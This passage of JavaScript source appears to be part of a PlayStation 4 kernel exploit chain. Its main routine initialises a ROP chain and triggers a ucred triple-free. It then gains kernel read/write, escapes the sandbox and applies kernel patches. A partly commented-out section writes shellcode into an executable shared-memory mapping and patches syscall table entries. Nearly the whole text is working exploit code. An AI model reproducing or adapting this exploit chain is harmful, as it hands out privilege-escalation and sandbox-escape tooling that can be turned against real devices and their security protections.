    const PROT_RWX   = PROT_READ | PROT_WRITE | PROT_EXEC;

    const alignedMemsz = 0x10000;

    // create shm with exec permission
    const execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0n, BigInt(alignedMemsz), BigInt(PROT_RWX));
    // create shm alias with write permission
    const writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, BigInt(PROT_RW));

    // map shadow mapping (writable) and write shellcode into it
    Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, BigInt(alignedMemsz), BigInt(PROT_RW), 0x11n, writeHandle, 0n);

    for (let i = 0; i < shellcode.length; i++) {
      // api.write8 expects an address and a byte value
      api.write8(shadowMappingAddr + BigInt(i), shellcode[i]);
    }

    // map executable segment (execHandle) at mappingAddr
    Helper.syscall(Helper.SYS_MMAP, mappingAddr, BigInt(alignedMemsz), BigInt(PROT_RWX), 0x11n, execHandle, 0n);

    // trigger kexec to make mapping executable + jump table etc.
    Helper.syscall(Helper.SYS_KEXEC, mappingAddr);

    // restore original syscall entry
    kwrite32(sysent661Addr, syNarg);
    kwrite64(sysent661Addr + 8n, syCall);
    kwrite32(sysent661Addr + 0x2cn, syThrcnt);

    // close write handle
    Helper.syscall(Helper.SYS_CLOSE, writeHandle);

  } catch (e) {
    log("exception in applyKernelPatchesPS4: " + e);
    return false;
  }

  return true;
}*/

export async function main() {
  await rop.init();
  chain = new Chain();

  rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);

	
  try {
    if (sysi("setuid", 0) == 0) {
      log("kernel already patched, skipping kexploit");
      return true;
    }
  } catch {
    // Expected when not in an exploited state
  }
	
  log("Pre-configuration");
  if (!performSetup()) {
    log("pre-config failure");
    cleanup();
    return -3;
  }

  log("Initial triple free");
  if (!triggerUcredTripleFree()) {
    log("triple free failed");
    cleanup();
    return -4;
  }

 
  if (!achieveRw(KQUEUE_TRIES)) {
    log("Leak / RW failed");
    cleanup();
  }

  log("Escaping sandbox");
  if (!escapeSandbox()) {
    log("Escape sandbox failed");
    cleanup();
    return -7;
  }

  log("Patching system");
  if (!applyKernelPatchesPS4()) {
    log("Applying patches failed");
    cleanup();
    return -8;
  }

  cleanup();

  return 0;
}



class WorkerState {
    constructor(totalWorkers) {
        this.totalWorkers = totalWorkers;

        this.workersStartedWork = 0;
        this.workersFinishedWork = 0;

        this.workCommand = -1;

    
        this.waiters = [];
    }


    wait() {
        return new Promise(resolve => {
            this.waiters.push(resolve);
        });
    }

    notifyAll() {
        const list = this.waiters;
        this.waiters = [];
        for (const resolve of list) resolve();
    }

    async signalWork(command) {
        this.workersStartedWork = 0;
        this.workersFinishedWork = 0;
        this.workCommand = command;

        this.notifyAll();

        while (this.workersStartedWork < this.totalWorkers) {
            await this.wait();
        }
    }

 
    async waitForFinished() {
        while (this.workersFinishedWork < this.totalWorkers) {
            await this.wait();
        }

        this.workCommand = -1;
    }

    async waitForWork() {
        while (this.workCommand === -1 || this.workersFinishedWork !== 0) {
            await this.wait();
        }

        this.workersStartedWork++;
        if (this.workersStartedWork === this.totalWorkers) {
            this.notifyAll();
        }

        return this.workCommand;
    }

    async signalFinished() {
        this.workersFinishedWork++;
        if (this.workersFinishedWork === this.totalWorkers) {
            this.notifyAll();
        }
    }
}

main();

































